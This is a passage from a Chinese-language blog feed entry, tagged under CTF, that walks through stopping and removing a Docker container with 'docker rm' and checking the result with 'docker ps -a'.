stop <span class="number">39</span>c</span><br></pre></td></tr></table></figure><p>（2）查看所有容器的运行状态（包含运行中的和已停止的）。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><p>3、删除容器（39c），查看所有容器的运行状态。<br>（1）删除容器。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rm <span class="number">39</span>c</span><br></pre></td></tr></table></figure><p>（2）查看所有容器的运行状态（包含运行中的和已停止的）。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><p>（3）容器（39c）已经不存在了，说明被成功删除了。</p>]]></content>
    
    
    <summary type="html">🥧docker删除镜像和容器</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="其他姿势" scheme="https://m3ngx1ng.github.io/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
</feed>
